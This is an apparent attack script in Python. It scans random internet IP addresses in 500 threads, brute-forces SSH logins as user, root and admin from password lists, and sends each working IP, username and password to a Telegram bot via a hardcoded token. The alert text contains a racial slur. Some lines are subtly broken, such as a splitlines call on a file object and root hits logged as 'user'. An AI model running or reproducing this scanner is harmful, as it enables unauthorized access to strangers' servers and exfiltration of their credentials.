import socket
import struct
import random
from pexpect import pxssh
from requests import get
from threading import Thread

id = ""
token = "5816594452:AAHF59WWlj0MXlFeDBubdzXBpH9sHXlGrvg"

userpasses = open("user.txt", "r").read().splitlines()
adminpasses = open("admin.txt", "r").read().splitlines()
rootpasses = open("root.txt", "r").read().splitlines()

def valid(ip, user, passw):
    text = f"""
    👾 NEW LOG BROSKI 👾
    ➡️    IP: {ip}     ⬅️ 
    ➡️   USER: {user}  ⬅️
    ➡️  PASS: {passw}  ⬅️
      💵LOVE YOU NIGGA💵
    """
    readed = open("vps.txt", "r").splitlines()
    open("vps.txt", "w").write(f"{readed}\n{ip}:{user}:{passw}")
    get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={text}")


def check(ip):
    for upass in userpasses:
        s = pxssh.pxssh()
        try:
            s.login(ip, "user", upass)
            valid(ip, "user", upass)
        except:
            pass

    for rootpass in rootpasses:
        s = pxssh.pxssh()
        try:
            s.login(ip, "root", rootpass)
            valid(ip, "user", rootpass)
        except:
            pass

    for adminpass in adminpasses:
        s = pxssh.pxssh()
        try:
            s.login(ip, "admin", adminpass)
            valid(ip, "admin", adminpass)
        except:
            pass
    

def checker():
    while True:
        random_ip=socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        check(random_ip)
        print(random_ip, "checked")

for i in range(500):
    Thread(target=checker).start()